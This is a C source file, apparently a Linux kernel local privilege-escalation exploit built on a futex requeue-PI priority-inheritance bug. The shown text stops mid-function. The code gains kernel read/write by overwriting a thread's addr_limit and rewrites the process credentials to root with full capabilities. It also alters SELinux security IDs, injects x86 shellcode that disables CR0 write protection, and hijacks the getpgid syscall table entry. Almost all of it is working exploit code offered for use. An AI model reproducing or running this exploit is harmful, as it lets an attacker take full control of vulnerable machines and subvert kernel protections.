#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <sys/resource.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>


// MACRO
// ------------------------------------------------
#define FUTEX_LOCK_PI            6
#define FUTEX_WAIT_REQUEUE_PI   11
#define FUTEX_CMP_REQUEUE_PI    12

#define KERNEL_START    0xc0000000
#define LOCAL_PORT            5551
#define THREAD_STACK_SIZE     8192

#define SIG_WRITE_ADDR_LIMIT    10
#define SIG_MASTER              16 
#define SIG_DO_NOTHING          30

#define ARRAY_SIZE(a) (sizeof (a) / sizeof (*(a)))


// Structure
// ------------------------------------------------
struct thread_info;
struct task_struct;
struct cred;
struct kernel_cap_struct;
struct list_head;
struct task_security_struct;
struct task_struct_partial;
struct mmsghdr;
struct action_argument;
struct thread_info_private;
struct plist_node;
struct rt_mutex_waiter;

struct thread_info {
    struct task_struct  *task;          /* main task structure */
    struct exec_domain  *exec_domain;   /* execution domain */
    __u32           flags;              /* low level flags */
    __u32           status;             /* thread synchronous flags */
    __u32           cpu;                /* current CPU */
    int         preempt_count;          /* 0 => preemptable,
                                          <0 => BUG */
    unsigned long  addr_limit;
    unsigned long  restart_block;
    /* ... */
};

struct kernel_cap_struct {
    unsigned long cap[2];
};

struct cred {
    unsigned long usage;
    uid_t uid;
    gid_t gid;
    uid_t suid;
    gid_t sgid;
    uid_t euid;
    gid_t egid;
    uid_t fsuid;
    gid_t fsgid;
    unsigned long securebits;
    struct kernel_cap_struct cap_inheritable;
    struct kernel_cap_struct cap_permitted;
    struct kernel_cap_struct cap_effective;
    struct kernel_cap_struct cap_bset;
    unsigned char jit_keyring;
    void *thread_keyring;
    void *request_key_auth;
    void *tgcred;
    struct task_security_struct *security;

    /* ... */
};

struct list_head {
    struct list_head *next;
    struct list_head *prev;
};

struct task_security_struct {
    unsigned long osid;
    unsigned long sid;
    unsigned long exec_sid;
    unsigned long create_sid;
    unsigned long keycreate_sid;
    unsigned long sockcreate_sid;
};

struct task_struct_partial {
    struct list_head cpu_timers[3];
    struct cred *real_cred;
    struct cred *cred;
    //struct cred *replacement_session_keyring;
    char comm[16];
};

struct mmsghdr {
    struct msghdr msg_hdr;
    unsigned int  msg_len;
};

struct action_argument {
    int prio;
    void (*action)();
};

struct task_struct {
    long state;
    void *stack;
};

struct thread_info_private {
    pid_t pid;
    struct task_struct *task;
    void *stack;
};

struct plist_node {
    int prio;
    struct list_head prio_list;
    struct list_head node_list;
};

struct rt_mutex_waiter {
    struct plist_node list_entry;
    struct plist_node pi_list_entry;
    struct task_struct *task;
    struct rt_mutex *lock;
};


// BSS Segment
// ------------------------------------------------
int uaddr1 = 0;
int uaddr2 = 0;

pid_t last_tid = 0;
pid_t pid_prio_6;
pid_t pid_prio_7;
pid_t pid_prio_11;
pid_t pid_prio_12;
pid_t waiter_thread_pid;
pid_t fix_waiter_list_action_thread_pid;
pthread_t pthread_prio_11;
pthread_t pthread_prio_12;
struct thread_info *thread_info_prio_11 = NULL;
struct thread_info *thread_info_prio_12 = NULL;

struct thread_info_private threads[20];
int threads_num = 0;
int waiter_index = 0;
void *lock;

unsigned long thread_prio_11_stack_base;
unsigned long thread_prio_12_stack_base;

pthread_mutex_t done_lock;
pthread_cond_t done;
pthread_mutex_t is_thread_desched_lock;
pthread_cond_t is_thread_desched;

volatile int do_socket_tid_read = 0;
volatile int did_socket_tid_read = 0;
volatile int do_splice_tid_read = 0;
volatile int did_splice_tid_read = 0;
volatile int do_dm_tid_read = 0;
volatile int did_dm_tid_read = 0;
volatile int did_write_addr_limit = 0;
volatile int do_fix_watier_list = 0;

unsigned long MAGIC = 0;
unsigned long MAGIC_ALT = 0;
unsigned long new_addr_limit = 0xffffffff;


// Prototype Declaration
// ------------------------------------------------
void print_threads_info(struct thread_info_private *threads, int threads_num);
void print_memory(void *buf, void *addr, size_t len, char *filename);

ssize_t read_pipe(void *writebuf, void *readbuf, size_t count);
ssize_t write_pipe(void *readbuf, void *writebuf, size_t count);

void do_nothing();
void write_addr_limit();
void do_privilege_escalation();
void hack_syscall(unsigned long *addr);
void inject_code();
void master();

void search_threads(void *stack_base, pid_t pid, struct thread_info_private *threads);
void search_waiter(void *stackbuf, int stack_len, int prio, struct rt_mutex_waiter *waiter, unsigned long *waiter_addr);
void fix_waiter(struct rt_mutex_waiter *waiter, unsigned long waiter_addr, struct thread_info_private thread, int prio);
void *fix_waiter_list_action();
void fix_waiter_list();

struct action_argument *action_argument_creater(int prio, void (*action)());
void *make_action(void *action_arg);
pid_t wake_actionthread(struct action_argument *action_arg);
int make_socket();
void *send_magicmsg(void *arg);
void *search_goodnum(void *arg);
void *accept_socket(void *arg);
void init_exploit();
static inline void setup_exploit(unsigned long mem);


// Function Definition
// ------------------------------------------------

/**
 * print_threads_info - print threads information table
 * 
 * @threads:     thread array
 * @threads_num: number of threads in array
 */
void print_threads_info(struct thread_info_private *threads, int threads_num) {
    int i;
    printf("\n     [ %d threads in the processus ]\n", threads_num);
    printf("---------------------------------------------\n");
    printf("           pid        task           stack\n");
    for (i = 0; i < threads_num; i ++) {
        printf(" Thread   %4d     %p     %p\n", threads[i].pid, threads[i].task, threads[i].stack);
    }
    printf("---------------------------------------------\n");
    return;
}  

/**
 * print_memory - print memory to a file
 *
 * @buf:      memory buffer to print
 * @addr:     the begining address of memory
 * @len :     memory buffer length
 * @filename: name of the file to which memory buffer will be printed
 */
void print_memory(void *buf, void *addr, size_t len, char *filename) {
    int i;
    FILE *fp;
    fp = fopen(filename, "w+");
    if (fp) {
        for (i = 0; i < len; i++) {
            fprintf(fp, "%p: %x\n", addr+4*i, ((unsigned int *)buf)[i]);
        }
    } else
        printf("Failed to open file.");

    fclose(fp);
    return;
}

/**
 * read_pipe and write_pipe functions work as shown below:
 *
 *  write(pipe[1], *buffer_1)
 *          |  ^          |
 *          |  |    (1)   |
 *          |  +----------+
 *      (2) |
 *          |
 *          V
 *  read(pipe[0],  *buffer_2) 
 *          |           ^
 *          |    (3)    |
 *          +-----------+
 */

/**
 * read_pipe - read data from kernel into userland buffer
 * @writebuf:  the kernel address of where to read
 * @readbuf:   the userland address of where to put the read data
 * @count:     the number of bytes to read
 */
ssize_t read_pipe(void *writebuf, void *readbuf, size_t count) {
    int pipefd[2];
    ssize_t len;

    pipe(pipefd);

    len = write(pipefd[1], writebuf, count);

    if (len != count) {
        printf("*** Thread %ld failed to read at %p: ***\n", syscall(__NR_gettid), writebuf);
        printf("        - return value: %d\n", (int)len);
        printf("        - errno: %d\n", errno);
        while (1) {
            sleep(10);
        }
    }

    read(pipefd[0], readbuf, count);

    close(pipefd[0]);
    close(pipefd[1]);

    return len;
}

/**
 * write_pipe - write data from userland into kernel
 * @readbuf:    the kernel address of where to write
 * @writebuf:   the userland address of where to read data
 * @count:      the number of bytes to write
 */
ssize_t write_pipe(void *readbuf, void *writebuf, size_t count) {
    int pipefd[2];
    ssize_t len;

    pipe(pipefd);

    write(pipefd[1], writebuf, count);
    len = read(pipefd[0], readbuf, count);

    if (len != count) {
        printf("*** Thread %ld failed to write at %p: ***\n", syscall(__NR_gettid), readbuf);
        printf("        - return value: %d\n", (int)len);
        printf("        - errno: %d\n", errno);
        while (1) {
            sleep(10);
        }
    }

    close(pipefd[0]);
    close(pipefd[1]);

    return len;
}

/**
 * do_nothing: will never be called 
 */
void do_nothing() {
    printf("Doing nothing\n");
    return;
}

/**
 * write_addr_limit - write '0xffffffff' to 'addr_limit' of 'thread_info'
 *
 * This function will be called when le signal 'SIG_WRITE_ADDR_LIMIT'
 * is triggered and will be executed by the thread with prio 11 after
 * its 'addr_limit' is changed to the address of 'plist_node' of thread
 * with prio 12.
 */
void write_addr_limit() {
    struct thread_info stackbuf;

    printf("[11] Thread %ld with prio 11 is changing 'addr_limit' of thread with prio 12:\n", syscall(__NR_gettid));

    read_pipe(thread_info_prio_12, &stackbuf, sizeof stackbuf);    
    printf("     -> addr_limit: %p\n", (void *)stackbuf.addr_limit);

    printf("     -> write 0xffffffff to addr_limit\n");
    write_pipe(&thread_info_prio_12->addr_limit, &new_addr_limit, sizeof new_addr_limit);

    read_pipe(thread_info_prio_12, &stackbuf, sizeof stackbuf);    
    printf("     -> addr_limit after changed: %p\n", (void *)stackbuf.addr_limit);
    
    did_write_addr_limit = 1;
    return;
}

/**
 * do_privilege_escalation - do privilege escalation to get root permission
 * 
 * Find and modify the 'cred' in 'task' structure.
 */
void do_privilege_escalation() {
    struct thread_info stackbuf;
    unsigned long taskbuf[0x100];
    struct cred *cred = NULL;
    struct cred credbuf;
    struct task_security_struct *security = NULL;
    struct task_security_struct securitybuf;
    pid_t pid = 0;
    int i;

    printf("\n\nPRIVILEGE ESCALATION:\n");
    printf("\n[1] Doing privilege escalation:\n");

    read_pipe(thread_info_prio_12, &stackbuf, sizeof stackbuf);
    read_pipe(stackbuf.task, taskbuf, sizeof taskbuf);

    printf("    -> changed values in 'task_struct.cred', got root privilege.\n");
    
    // Firstly find the 'cpu_timers', then 'cred' structure in 'task' 
    for (i = 0; i < ARRAY_SIZE(taskbuf); i++) {
        struct task_struct_partial *task = (void *)&taskbuf[i];

        if (task->cpu_timers[0].next == task->cpu_timers[0].prev && 
            (unsigned long)task->cpu_timers[0].next > KERNEL_START && 
            task->cpu_timers[1].next == task->cpu_timers[1].prev &&
            (unsigned long)task->cpu_timers[1].next > KERNEL_START && 
            task->cpu_timers[2].next == task->cpu_timers[2].prev && 
            (unsigned long)task->cpu_timers[2].next > KERNEL_START &&
            task->real_cred == task->cred) {

            cred = task->cred;
            break;
        }
    }

    read_pipe(cred, &credbuf, sizeof credbuf);

    security = credbuf.security;

    if ((unsigned long)security > KERNEL_START && (unsigned long)security < 0xffff0000) {
        read_pipe(security, &securitybuf, sizeof securitybuf);

        if (securitybuf.osid != 0 && 
            securitybuf.sid != 0 && 
            securitybuf.exec_sid == 0 && 
            securitybuf.create_sid == 0 && 
            securitybuf.keycreate_sid == 0 && 
            securitybuf.sockcreate_sid == 0) {

            securitybuf.osid = 1;
            securitybuf.sid = 1;

            printf("     -> task_security_struct: %p\n", security);
            write_pipe(security, &securitybuf, sizeof securitybuf);
        }
    }

    credbuf.uid = 0;
    credbuf.gid = 0;
    credbuf.suid = 0;
    credbuf.sgid = 0;
    credbuf.euid = 0;
    credbuf.egid = 0;
    credbuf.fsuid = 0;
    credbuf.fsgid = 0;

    credbuf.cap_inheritable.cap[0] = 0xffffffff;
    credbuf.cap_inheritable.cap[1] = 0xffffffff;
    credbuf.cap_permitted.cap[0] = 0xffffffff;
    credbuf.cap_permitted.cap[1] = 0xffffffff;
    credbuf.cap_effective.cap[0] = 0xffffffff;
    credbuf.cap_effective.cap[1] = 0xffffffff;
    credbuf.cap_bset.cap[0] = 0xffffffff;
    credbuf.cap_bset.cap[1] = 0xffffffff;

    write_pipe(cred, &credbuf, sizeof credbuf);

    pid = syscall(__NR_gettid);

    for (i = 0; i < ARRAY_SIZE(taskbuf); i++) {
        static unsigned long write_value = 1;

        if (taskbuf[i] == pid) {
            write_pipe(((void *)stackbuf.task) + (i << 2), &write_value, sizeof write_value);

            if (getuid() != 0) {
                printf("****** FAILED ******\n");
                while (1) {
                    sleep(10);
                }
            } else {    
                    // [*] rooted
                break;
            }
        }
    }

    return;
}

/**
 * hack_syscall - hack the 'sys_getpgid' entry in syscall table
 * 
 * @addr: the address of new syscall code
 *
 * This function will modify the 'sys_getpgid' entry in syscall table
 * to make it point to the new syscall.
 */
void hack_syscall(unsigned long *addr){
    unsigned long sys_call_table = 0xc1623220;
    unsigned long getpgid_addr;
    unsigned long buf[1];

    getpgid_addr = sys_call_table + __NR_getpgid * sizeof(sys_call_table);

    printf("\n[1] Got syscall table address: %p\n", (void *)sys_call_table);

    printf("[2] Changing 'sys_getpgid' entry value :\n");
    read_pipe((void *)getpgid_addr, buf, sizeof(buf));
    printf("    -> old 'sys_getpgid' entry value : %p\n", (void*)buf[0]);

    printf("    -> wrote %p (address of new syscall) to 'sys_getpgid' entry\n", (void *)addr);
    write_pipe((void *)getpgid_addr, (void *)&addr, sizeof(addr));

    read_pipe((void *)getpgid_addr, buf, sizeof(buf));
    printf("    -> read 'sys_getpgid' entry's new value: %p\n\n", (void*)buf[0]);
    
    return;
}

/**
 * inject_code - inject code into kernel space
 *
 * This function will do following things:
 *  1. Inject the first payload into kernel stack of a thread and execute it:
 *     to change the control register CR0 value and allocate a memory space 
 *     from kernel heap by calling '__kmalloc()'
 *
 *  2. Inject the new syscall code into new allocated memory space to make
 *     code persistent.
 */
void inject_code() {
    struct thread_info stackbuf;
    unsigned long payload_addr;
    unsigned long *kernel_mem;

    /*
        Opcodes:

        0:  0f 20 c0                mov    eax, cr0
        3:  25 ff ff fe ff          and    eax, 0xfffeffff
        8:  0f 22 c0                mov    cr0, eax 
        b:  b8 00 04 00 00          mov    eax,0x400
        10: ba 10 00 00 00          mov    edx,0x10
        15: bb 40 0c 15 c1          mov    ebx,0xc1150c40 -> '__kmalloc()'
        1a: ff d3                   call   ebx
        1c: 89 e1                   mov    ecx,esp
        1e: 81 e1 00 e0 ff ff       and    ecx,0xffffe000
        24: 81 c1 00 05 00 00       add    ecx,0x500
        2a: 89 01                   mov    DWORD PTR [ecx],eax
        2c: c3                      ret

        Modify CR0 and call '__kmalloc()' to allocate 1024 bytes from kernel heap
    */
    unsigned char payload[] = \
   
    "\x0F\x20\xC0"
    "\x25\xFF\xFF\xFE\xFF"
    "\x0F\x22\xC0"
    "\xB8\x00\x04\x00\x00"
    "\xBA\x10\x00\x00\x00"
    "\xBB\x40\x0C\x15\xC1" // should be changed to address of '__kmalloc()'
    "\xff\xd3"
    "\x89\xE1"
    "\x81\xE1\x00\xE0\xFF\xFF"
    "\x81\xC1\x00\x05\x00\x00"
    "\x89\x01"
    "\xC3";

    printf("\n\nINJECT CODE:\n");
    printf("\n    Inject First Payload to Thread Kernel Stack\n");
    printf("    ===========================================\n");
    
    // Set payload address
    payload_addr = thread_prio_11_stack_base + 0x500;

    // Write payload to thread kernel stack
    printf("\n[1] Injecting payload to thread kernel stack at %p\n", (void *)payload_addr);
    write_pipe((void *)payload_addr, payload, sizeof(payload));
    
    // Read 'restart_block' from 'thread_info'
    printf("[2] Changing 'restart_block' in 'thread_info' structure:\n");
    read_pipe(thread_info_prio_12, &stackbuf, sizeof stackbuf);
    printf("    -> old 'restart_block' value: %p\n", (void *)stackbuf.restart_block);

    // Write the payload address to 'restart_block'
    write_pipe(&thread_info_prio_12->restart_block, &payload_addr, sizeof payload_addr);
    printf("    -> write payload address (%p) to 'restart_block'\n", (void *)payload_addr);

    // Checking if the writing succeeds
    read_pipe(thread_info_prio_12, &stackbuf, sizeof stackbuf);
    printf("    -> new 'restart_block' value: %p\n", (void *)stackbuf.restart_block);

    // Call syscall 'sys_restart_syscall' to execute our payload
    printf("[3] Calling syscall 'sys_restart_syscall' to execute payload...\n\n");
    syscall(__NR_restart_syscall);

    printf("\n    Inject New Syscall to Kernel Heap\n");
    printf("    =================================\n");

    // Get the address allocated from kernel heap
    printf("\n[1] Getting allocated kernel memory at %p, 1024 bytes\n", (void *)kernel_mem);
    read_pipe((void *)(thread_prio_12_stack_base+0x500), &kernel_mem, sizeof(unsigned long));    
    
    /*
        Opcodes:

        0:  55                      push   ebp
        1:  89 e5                   mov    ebp,esp
        3:  53                      push   ebx
        4:  51                      push   ecx
        5:  6a 00                   push   0x0
        7:  6a 00                   push   0x0
        9:  6a ff                   push   0xffffffff
        b:  6a 00                   push   0x0
        d:  bb 0c ec 60 c1          mov    ebx,0xc160ec0c -> 'vprintk_emit()'
        12: ff d3                   call   ebx
        14: c9                      leave
        15: c3                      ret

        Call kernel function 'printk_emit()' to print message 
        in kernel log.
    */
    unsigned char new_syscall[] = \

    "\x55"
    "\x89\xE5"
    "\x83\xc7\x04"
    "\x57"
    "\x53"
    "\x6A\x00"
    "\x6A\x00"
    "\x6A\xFF"
    "\x6A\x00"
    "\xBB\x0C\xEC\x60\xC1" // should be changed to address of 'vprintk_emit()'
    "\xFF\xD3"
    "\xC9"
    "\xC3";

    // Write new syscall code to kernel heap
    printf("[2] Injecting new syscall code to kernel heap at %p\n\n", (void *)kernel_mem);
    write_pipe((void *)kernel_mem, &new_syscall, sizeof new_syscall);


    printf("\n    Hack Syscall Table Entry\n");
    printf("    ========================\n");

    // Hack the syscall table
    hack_syscall(kernel_mem);

    printf("\n    Call Hacked 'sys_getpgid' Syscall\n");
    printf("    =================================\n");

    // Call hacked syscall 'sys_getpgid'
    char str[] = \
    "Hello world!\n"
    "Hello world!\n"
    "Hello world!\n"
    "Important thing should be said 3 times!\n";
    printf("\n[1] Calling the new getpgid syscall...\n");
    getpgid((pid_t)str);

    return;
}

/** 
 * serach_threads - search all threads in current processus from a known thread
 *
 * @stack_base: thread stack base
 * @pid:        thread pid
 * @threads:    thread array which will be populated after execution,
 *              every element contains useful info about a thread
 */
void search_threads(void *stack_base, pid_t pid, struct thread_info_private *threads) {
    struct thread_info stackbuf;
    int taskbuf_len = 0x100;
    unsigned long *taskbuf = malloc(taskbuf_len*sizeof(unsigned long));
    int i;

    read_pipe(stack_base, &stackbuf, sizeof stackbuf);
    read_pipe(stackbuf.task, taskbuf, taskbuf_len*sizeof(unsigned long));

    // Find cpu_timers index
    int cpu_timers_index = 0;
    int pid_index = 0;
    struct task_struct_partial *task;
    for (i = 0; i < taskbuf_len; i++) {
        task = (void *)&taskbuf[i];

        if (pid == taskbuf[i]) {
            pid_index = i;
        }

        if (task->cpu_timers[0].next == task->cpu_timers[0].prev && 
            (unsigned long)task->cpu_timers[0].next > KERNEL_START && 
            task->cpu_timers[1].next == task->cpu_timers[1].prev &&
            (unsigned long)task->cpu_timers[1].next > KERNEL_START && 
            task->cpu_timers[2].next == task->cpu_timers[2].prev && 
            (unsigned long)task->cpu_timers[2].next > KERNEL_START &&
            task->real_cred == task->cred) {

            cpu_timers_index = i;
            break;
        }
    }

    // Find thread_group index
    int thread_group_index = 0;
    struct list_head *thread_group;
    for (i = cpu_timers_index; i > 0; i--) {
        thread_group = (struct list_head *)&taskbuf[i];

        if ((unsigned long)thread_group->next > KERNEL_START &&
            (unsigned long)thread_group->prev > KERNEL_START &&
            thread_group->next != thread_group->prev) {

            thread_group_index = i;
            break;
        }
    }

    // Get thread_group
    struct list_head thread_group_original;
    unsigned long thread_group_addr = (unsigned long)stackbuf.task + thread_group_index*sizeof(unsigned long);

    memcpy(&thread_group_original, &taskbuf[thread_group_index], sizeof thread_group_original);

    // Calculate thread number in the processus
    threads_num = 2;
    struct list_head thread_group_tmp;
    unsigned long ptrs[20];
    memcpy(&thread_group_tmp, &thread_group_original, sizeof thread_group_tmp);
    ptrs[0] = thread_group_addr;
    ptrs[1] = (unsigned long)thread_group_original.next;

    while (1) {
        read_pipe(thread_group_tmp.next, &thread_group_tmp, sizeof thread_group_tmp);
        if ((unsigned long)thread_group_tmp.next == thread_group_addr)
            break;
        else {
            ptrs[threads_num] = (unsigned long)thread_group_tmp.next;
            threads_num++;
        }
    }

    // Collect threads info
    unsigned long pid_addr;
    struct task_struct tsk;
    for (i = 0; i < threads_num; i++) {
        pid_addr = ptrs[i] - (thread_group_index-pid_index)*sizeof(unsigned long);
        read_pipe((void *)pid_addr, &threads[i].pid, sizeof(pid_t));

        threads[i].task = (struct task_struct *)(ptrs[i] - (unsigned long)thread_group_index*sizeof(unsigned long));

        read_pipe((void *)threads[i].task, &tsk, sizeof(struct task_struct));
        threads[i].stack = tsk.stack;
    }

    return;
}

/**
 * search_waiter - search 'rt_mutex_waiter' structure from a thread kernel stack 
 *
 * @stackbuf:   thread kernel stack address
 * @stack_len:  stack length (bytes)
 * @prio:       thread priority value
 * @waiter:     to be populated after finding the waiter
 * @witer_addr: to be populated after finding the waiter
 */
void search_waiter(void *stackbuf, int stack_len, int prio, struct rt_mutex_waiter *waiter, unsigned long *waiter_addr) {
    int i;
    int prio_final = prio + 120;
    struct task_struct task;

    read_pipe((void *)((struct thread_info *)stackbuf)->task, &task, sizeof(struct task_struct));

    if (waiter_index) {
        *waiter_addr = (unsigned long)task.stack + ((unsigned long)(waiter_index))*sizeof(unsigned long);
        memcpy(waiter, &((unsigned long *)stackbuf)[waiter_index], sizeof(struct rt_mutex_waiter));
    } else {
        for (i = stack_len - sizeof(struct rt_mutex_waiter); i > 0; i--) {
            memcpy(waiter, &((unsigned long *)stackbuf)[i], sizeof(struct rt_mutex_waiter));
            if (waiter->list_entry.prio == prio_final &&
                waiter->pi_list_entry.prio == prio_final) {

                *waiter_addr = (unsigned long)task.stack + ((unsigned long)(i))*sizeof(unsigned long);
                waiter_index = i;
                break;
            }
        }
    }

    return;
}

/**
 * fix_waiter - fix a corrupt 'waiter'
 *
 * @waiter:      the corrupt 'waiter'
 * @waiter_addr: the address of corrupt 'waiter'
 * @thread:      the target thread
 * @prio:        thread priority value
 */
void fix_waiter(struct rt_mutex_waiter *waiter, unsigned long waiter_addr, struct thread_info_private thread, int prio) {
    waiter->list_entry.prio = prio + 120;
    waiter->pi_list_entry.prio = prio + 120;
    waiter->list_entry.prio_list.next = (struct list_head *)(waiter_addr + sizeof(unsigned long));
    waiter->list_entry.prio_list.prev = (struct list_head *)(waiter_addr + sizeof(unsigned long));
    waiter->list_entry.node_list.next = (struct list_head *)(waiter_addr + sizeof(unsigned long)*3); 
    waiter->list_entry.node_list.prev = (struct list_head *)(waiter_addr + sizeof(unsigned long)*3);
    waiter->pi_list_entry.prio_list.next = (struct list_head *)(waiter_addr + sizeof(unsigned long)*6);
    waiter->pi_list_entry.prio_list.prev = (struct list_head *)(waiter_addr + sizeof(unsigned long)*6);
    waiter->pi_list_entry.node_list.next = (struct list_head *)(waiter_addr + sizeof(unsigned long)*8);
    waiter->pi_list_entry.node_list.prev = (struct list_head *)(waiter_addr + sizeof(unsigned long)*8);
    waiter->task = thread.task;
    waiter->lock = lock;

    //printf("waiter_addr: %p\n", (void *)waiter_addr);
    // printf("watier.list_entry.prio_list.prio: %d\n", waiter->list_entry.prio);
    // write_pipe((void *)waiter_addr, waiter, sizeof(struct rt_mutex_waiter));

    // struct rt_mutex_waiter waiter_buf;
    // read_pipe((void *)waiter_addr, &waiter_buf, sizeof(struct rt_mutex_waiter));

    // printf("Waiter fixed:\n");
    // printf("%p %p %p %p %p\n", (void *)waiter_buf.list_entry.prio, 
    //                            (void *)waiter_buf.list_entry.prio_list.next,
    //                            (void *)waiter_buf.list_entry.prio_list.prev, 
    //                            (void *)waiter_buf.list_entry.node_list.next,
    //                            (void *)waiter_buf.list_entry.node_list.prev);

    // printf("%p %p %p %p %p\n", (void *)waiter_buf.pi_list_entry.prio, 
    //                            (void *)waiter_buf.pi_list_entry.prio_list.next,
    //                            (void *)waiter_buf.pi_list_entry.prio_list.prev, 
    //                            (void *)waiter_buf.pi_list_entry.node_list.next,
    //                            (void *)waiter_buf.pi_list_entry.node_list.prev);

    // printf("%p %p\n", (void *)waiter_buf.task, (void *)waiter_buf.lock);
    return;
}

/**
 * fix_waiter_list_action - fix the waiter list
 */
void *fix_waiter_list_action() {
    int i;
    unsigned long *stackbuf = malloc(THREAD_STACK_SIZE);
    int stack_len = THREAD_STACK_SIZE / sizeof(unsigned long);
    fix_waiter_list_action_thread_pid = syscall(__NR_gettid);

    while (1) {
        if (do_fix_watier_list)
            break;
    }

    // Read stack of the thread with prio 6
    for (i = 0; i < threads_num; i++) {
        if (threads[i].pid == pid_prio_6) {
            read_pipe(threads[i].stack, stackbuf, THREAD_STACK_SIZE);
            break;
        }
    }

    // Find waiter 
    struct rt_mutex_waiter *waiter = malloc(sizeof(struct rt_mutex_waiter));
    unsigned long waiter_addr = 0;
    search_waiter((void *)stackbuf, stack_len, 6, waiter, &waiter_addr);
    lock = waiter->lock;

    printf("\nThread with prio 6:\n");
    printf("    -> waiter address: %p\n", (void *)waiter_addr);

    // Fix waiter in threads with prio 7, 11, 12
    for (i = 0; i < threads_num; i++) {
        if (threads[i].pid == pid_prio_7) {
            read_pipe(threads[i].stack, stackbuf, THREAD_STACK_SIZE);
            search_waiter((void *)stackbuf, stack_len, 7, waiter, &waiter_addr);
            printf("------------------------------------\n");
            printf("Thread with prio 7:\n");
            printf("    -> waiter.task: %p\n", (void *)waiter->task);
            printf("    -> waiter address: %p\n", (void *)waiter_addr);
            fix_waiter(waiter, waiter_addr, threads[i], 7);
            printf("    -> Got fixed\n");
        } else if (threads[i].pid == pid_prio_11) {
            read_pipe(threads[i].stack, stackbuf, THREAD_STACK_SIZE);
            search_waiter((void *)stackbuf, stack_len, 11, waiter, &waiter_addr);
            printf("------------------------------------\n");
            printf("Thread with prio 11:\n");
            printf("    -> waiter.task: %p\n", (void *)waiter->task);
            printf("    -> waiter address: %p\n", (void *)waiter_addr);
            fix_waiter(waiter, waiter_addr, threads[i], 11);
            printf("    -> Got fixed\n");
        } else if (threads[i].pid == pid_prio_12) {
            read_pipe(threads[i].stack, stackbuf, THREAD_STACK_SIZE);
            search_waiter((void *)stackbuf, stack_len, 12, waiter, &waiter_addr);
            printf("------------------------------------\n");
            printf("Thread with prio 12:\n");
            printf("    -> waiter.task: %p\n", (void *)waiter->task);
            printf("    -> waiter address: %p\n", (void *)waiter_addr);
            fix_waiter(waiter, waiter_addr, threads[i], 12);
            printf("    -> Got fixed\n");
        }
    }

    free(stackbuf);
    free(waiter);

    return NULL;
    // Read stack of the thread with prio 12
    // for (i = 0; i < threads_num; i++) {
    //     if (threads[i].pid == pid_prio_12) {
    //         read_pipe(threads[i].stack, stackbuf, THREAD_STACK_SIZE);
    //         print_memory(stackbuf, threads[i].stack, stack_len, "thread_prio_12_stack.txt");
    //         break;
    //     }
    // }

    // for (i = 0; i < threads_num; i++) {
    //     if (threads[i].pid == pid_prio_11) {
    //         read_pipe(threads[i].stack, stackbuf, THREAD_STACK_SIZE);
    //         print_memory(stackbuf, threads[i].stack, stack_len, "thread_prio_11_stack.txt");
    //         break;
    //     } 
    // }

    // for (i = 0; i < threads_num; i++) {
    //     if (threads[i].pid == pid_prio_7) {
    //         read_pipe(threads[i].stack, stackbuf, THREAD_STACK_SIZE);
    //         print_memory(stackbuf, threads[i].stack, stack_len, "thread_prio_7_stack.txt");
    //         break;
    //     }
    // }
}

/**
 * fix_waiter_list - the wrapper of the action of fixing waiter list
 *
 * - Change 'addr_limit' of the thread which performs fixing work.
 * - Trigger the fixing waiter list action
 */
void fix_waiter_list() {
    int i;
    
    printf("\nFIX WAITER LIST:\n");

    print_threads_info(threads, threads_num);

    for (i = 0; i < threads_num; i++) {
        if (threads[i].pid == fix_waiter_list_action_thread_pid)
            break;
    }

    write_pipe(&((struct thread_info *)threads[i].stack)->addr_limit, &new_addr_limit, sizeof new_addr_limit);
    
    do_fix_watier_list = 1;

    return;
}

/**
 * master - accomplish all other exploits after 'addr_limit' is changed to 0xffffffff
 */
void master() {
    printf("\n    [--- Final Stage: Exploitation ---]\n");
    
    search_threads((void *)thread_prio_11_stack_base, pid_prio_11, threads);
    
    do_privilege_escalation();

    inject_code();

    fix_waiter_list();

    while(1) {
        sleep(10);
    }

    return;
}

struct action_argument *action_argument_creater(int prio, void (*action)()) {
    struct action_argument *action_arg = malloc(sizeof (struct action_argument));
    action_arg->prio = prio;
    action_arg->action = action;
    return action_arg;
}

void *make_action(void *action_arg) {
    int prio;
    struct sigaction act;
    int ret;
    pid_t pid;    

    prio = ((struct action_argument *)action_arg)->prio;
    last_tid = syscall(__NR_gettid);
    pid = syscall(__NR_gettid);
    
    pthread_mutex_lock(&is_thread_desched_lock);
    pthread_cond_signal(&is_thread_desched);

    act.sa_handler = ((struct action_argument *)action_arg)->action;
    sigemptyset(&act.sa_mask);
    act.sa_flags = 0;
    act.sa_restorer = NULL;

    if (prio == 11) {
        sigaction(SIG_WRITE_ADDR_LIMIT, &act, NULL);
        pthread_prio_11 = pthread_self();
    } else if (prio == 12) {
        sigaction(SIG_MASTER, &act, NULL);
        pthread_prio_12 = pthread_self();
    } else
        sigaction(SIG_DO_NOTHING, &act, NULL);        

    setpriority(PRIO_PROCESS, 0, prio);

    pthread_mutex_unlock(&is_thread_desched_lock);

    do_dm_tid_read = 1;

    while (did_dm_tid_read == 0) {
        ;
    }

    if (prio == 11) {
        printf("[8] Thread %d's waiter (prio %d) is inserted between waiters (prio 9 and 13)\n", pid, prio);
    } else if (prio == 12) {
        printf("[9] Thread %d's waiter (prio %d) is inserted between waiters (prio 11 and 13)\n", pid, prio);
    }

    ret = syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
    printf("___futex dm: %d\n", ret);

    while (1) {
        sleep(10);
    }

    return NULL;
}

pid_t wake_actionthread(struct action_argument *action_arg) {
    pthread_t th;
    pid_t pid;
    char filename[256];
    FILE *fp;
    char filebuf[0x1000];
    char *pdest;
    int vcscnt, vcscnt2;

    do_dm_tid_read = 0;
    did_dm_tid_read = 0;

    pthread_mutex_lock(&is_thread_desched_lock);
    pthread_create(&th, 0, make_action, (void *)action_arg);
    pthread_cond_wait(&is_thread_desched, &is_thread_desched_lock);

    pid = last_tid;

    sprintf(filename, "/proc/self/task/%d/status", pid);

    fp = fopen(filename, "rb");
    if (fp == 0) {
        vcscnt = -1;
    } else {
        fread(filebuf, 1, sizeof filebuf, fp);
        pdest = strstr(filebuf, "voluntary_ctxt_switches");
        pdest += 0x19;
        vcscnt = atoi(pdest);
        fclose(fp);
    }

    // Sync with the action thread to find a voluntary ctxt switch
    while (do_dm_tid_read == 0) {
        usleep(10);
    }

    did_dm_tid_read = 1;

    while (1) {
